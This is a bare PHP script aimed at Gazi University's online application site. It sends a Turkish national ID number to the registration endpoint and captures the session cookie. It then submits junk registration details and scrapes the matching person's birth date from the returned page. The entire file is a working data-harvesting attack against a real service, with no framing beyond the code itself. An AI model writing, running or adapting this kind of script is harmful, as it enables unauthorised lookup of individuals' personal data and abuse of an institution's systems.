<?php
function Capture($str, $starting_word, $ending_word){
  $subtring_start  = strpos($str, $starting_word);
  $subtring_start += strlen($starting_word);
  $size            = strpos($str, $ending_word, $subtring_start) - $subtring_start;
  return substr($str, $subtring_start, $size);
};
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://basvuru.gazi.edu.tr/register");
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "tcid=$tc");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);
curl_close($ch);
preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $matches);
$cookies = array();
foreach($matches[1] as $item) {
    parse_str($item, $cookie);
    $cookies = array_merge($cookies, $cookie);
}
$json = json_encode($cookies);
$cookie = Capture($json, 'GaziSEM":"','"');
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://basvuru.gazi.edu.tr/register');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "parola=vEdv3JMa6NFieQJ&parola_tekrar=vEv3JMa6NFieQJ&eposta=asdasd%40gmail.comasdad&ceptel=%28123%29+123-1231");
curl_setopt($ch, CURLOPT_COOKIE, "GaziSEM=$cookie");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$sonuc = curl_exec($ch);
curl_close($ch);
$dogum = Capture($sonuc, '<th>Doğum Tarihi</th>','</td>');
$dogum=str_replace(' ','',$dogum);
$dogum=str_replace('<td>','',$dogum);
?>